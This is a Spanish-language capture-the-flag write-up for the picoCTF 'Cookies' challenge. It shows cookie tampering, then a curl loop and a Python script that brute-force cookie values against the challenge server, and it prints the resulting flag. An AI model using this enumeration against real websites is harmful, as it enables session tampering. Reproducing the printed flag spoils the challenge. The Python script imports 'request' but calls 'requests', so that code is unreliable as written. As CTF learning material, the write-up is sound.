### Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:54219/](http://mercury.picoctf.net:54219/)
### Solución
Se inicia dando clic en el enlace proporcionado por la descripción del reto, al iniciarlo, tenemos lo siguiente:

![[Pasted image 20250325220833.png]]

Por lo que se prueba ingresando un nombre de alguna galleta como es el caso de "*hola*", lo cual no existe, al ingresarlo, nos arroja un mensaje de que **no es una galleta valida**, y si usamos la herramienta de Cookie-Editor instalada en un reto anterior, tenemos lo que nos muestra la siguiente imagen:

![[Pasted image 20250325221019.png]]

Se cambia el valor de la variable, se guarda y se actualiza, con lo cual ahora sí nos arroja una **galleta válida** como se aprecia en la siguiente imagen:

![[Pasted image 20250325221550.png]]

Pero el estar haciendo eso, con cada valor, sería muy cansado, por lo que se procede a usar la consola, en este caso se emplea la proporcionada por la página picoGym, donde se ingresa el siguiente comando: 

```
for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep picoCTF
```

Con este comando lograremos que se envíen varias solicitudes HTTP a un servidor web, el argumento **-H**, sirve para agregar un encabezado HTTP, por lo que ejecutado en la consola se aprecia algo así:

```shell
the_robx-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}</code></p>
```

Por fortuna, la bandera si estaba entre las primeras 21 opciones o posibilidades de valor, ya que si no hubiera sido así, se tendría que agrandar el rango del ciclo for, dicha bandera es:

```
picoCTF{3v3ry1_l0v3s_c00k135_96cdadfd}
```
### Notas Adicionales
Se puede hacer una mejor búsqueda con grep, haciendo lo siguiente:

```
the_robx-picoctf@webshell:~$ for i in {0..20}; do curl -s http://mercury.picoctf.net:54219/check -H "Cookie: name=$i"; done | grep -oE "picoCTF{.*?}"
```

Usando un Script de python:

```python
import request
import re

url = "http://mercury.picoctf.net:54219/check"

for i in range(20):
		cookies = {'name' : '{}'.format(i)}
		print(cookies)
		r = requests.get(url, cookies=cookies)
		if 'picoCTF' in r.text:
			print(r.text)
			flag = re.findall('picoCTF{.*?}', r.text)[0]
			print(flag)
```
### Referencias